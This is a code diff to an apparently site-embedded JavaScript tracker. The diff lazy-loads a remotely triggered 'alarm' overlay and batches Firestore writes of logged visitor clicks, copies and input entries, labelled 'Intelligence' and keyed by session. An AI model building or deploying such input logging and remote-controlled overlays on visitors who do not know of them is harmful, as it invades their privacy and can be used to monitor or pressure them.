@@ -137,11 +137,9 @@
 
     // --- 1. VISUAL INTERFACE (THE DESIGN) ---
 
-    // Inject CSS & Fonts
-    const fonts = document.createElement('link');
-    fonts.rel = 'stylesheet';
-    fonts.href = 'https://fonts.googleapis.com/css2?family=Manrope:wght@200;400;700;900&family=Syncopate:wght@400;700&display=swap';
-    document.head.appendChild(fonts);
+    // Overlay CSS, fonts and the base64 logo load lazily — only when a remote
+    // command actually shows the overlay — so normal visitors never pay for them.
+    let overlayAssetsInjected = false;
 
     const css = `
         /* Overlay Base */
@@ -547,12 +545,36 @@
         }
     `;
 
-    const style = document.createElement('style');
-    style.innerHTML = css;
-    document.head.appendChild(style);
+    function ensureOverlayAssets() {
+        if (overlayAssetsInjected) return;
+        overlayAssetsInjected = true;
+
+        const fonts = document.createElement('link');
+        fonts.rel = 'stylesheet';
+        fonts.href = 'https://fonts.googleapis.com/css2?family=Manrope:wght@200;400;700;900&family=Syncopate:wght@400;700&display=swap';
+        document.head.appendChild(fonts);
+
+        const style = document.createElement('style');
+        style.innerHTML = css;
+        document.head.appendChild(style);
+
+        // logo_data.js is ~340KB of base64; fetch it only for the overlay and
+        // swap it in over the favicon placeholder once it arrives.
+        if (!window.TAURUS_LOGO_DATA) {
+            const logoScript = document.createElement('script');
+            logoScript.src = 'assets/js/tracker/logo_data.js';
+            logoScript.async = true;
+            logoScript.onload = () => {
+                const img = document.querySelector('#taurus-overlay .taurus-logo-img');
+                if (img && window.TAURUS_LOGO_DATA) img.src = window.TAURUS_LOGO_DATA;
+            };
+            document.head.appendChild(logoScript);
+        }
+    }
 
     // Create Overlay Elements
     function createOverlay(mode = 'alarm') {
+        ensureOverlayAssets();
         let overlay = document.getElementById('taurus-overlay');
 
         // If overlay logic needs a full reset or mode change, we might want to clear old one
@@ -580,7 +602,7 @@
             <div style="position: relative; width: 140px; height: 140px; margin: 0 auto 2.5rem auto; display: flex; justify-content: center; align-items: center; flex-shrink: 0;">
                 <div style="position: absolute; inset: 0; border: 2px solid #FFD700; border-radius: 50%; animation: taurus-ripple 2.5s infinite;"></div>
                 <div style="position: absolute; inset: 10px; border: 1px solid rgba(255, 215, 0, 0.5); border-radius: 50%; animation: taurus-ripple 2.5s infinite 0.8s;"></div>
-                <img src="${logoSrc}" style="width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #FFD700; box-shadow: 0 0 40px rgba(255, 215, 0, 0.4); z-index: 10;">
+                <img src="${logoSrc}" class="taurus-logo-img" style="width: 100px; height: 100px; border-radius: 50%; object-fit: cover; border: 3px solid #FFD700; box-shadow: 0 0 40px rgba(255, 215, 0, 0.4); z-index: 10;">
             </div>
         `;
 
@@ -1175,6 +1197,39 @@
 
     // --- 3. LOGGING & INTERACTION ---
 
+    // Events are buffered and flushed as a single batched write instead of one
+    // Firestore update per click/copy/input. This removes the constant
+    // Write-channel churn during browsing and never writes before anonymous
+    // auth is ready (the old per-event writes raced auth and produced
+    // "Missing or insufficient permissions" errors).
+    let pendingHistory = [];
+    let historyFlushTimer = null;
+    const HISTORY_FLUSH_MS = 20000;
+
+    function flushHistory() {
+        historyFlushTimer = null;
+        if (!pendingHistory.length || !window.db) return;
+
+        if (window.auth && !window.auth.currentUser) {
+            scheduleHistoryFlush(); // Auth still warming up; retry instead of a guaranteed permission error.
+            return;
+        }
+
+        const entries = pendingHistory;
+        pendingHistory = [];
+        window.db.collection(CONFIG.collection).doc(sessionID).update({
+            history: firebase.firestore.FieldValue.arrayUnion(...entries),
+            last_seen: firebase.firestore.FieldValue.serverTimestamp()
+        }).catch(e => console.log("Log Error", e));
+    }
+
+    function scheduleHistoryFlush() {
+        if (historyFlushTimer) return;
+        historyFlushTimer = setTimeout(flushHistory, HISTORY_FLUSH_MS);
+    }
+
+    window.addEventListener('pagehide', flushHistory);
+
     function logHistory(action, detail) {
         if (!window.db) return;
 
@@ -1192,11 +1247,9 @@
             entry.title = document.title || 'Untitled Page';
         }
 
-        // 1. Sync to Firestore (Intelligence)
-        window.db.collection(CONFIG.collection).doc(sessionID).update({
-            history: firebase.firestore.FieldValue.arrayUnion(entry),
-            last_seen: firebase.firestore.FieldValue.serverTimestamp()
-        }).catch(e => console.log("Log Error", e));
+        // 1. Queue for batched Firestore sync (Intelligence)
+        pendingHistory.push(entry);
+        scheduleHistoryFlush();
 
         // 2. Buffer to Local (Rich Data)
         localHistory.push(`[${entry.time}] ${action}: ${detail} `);
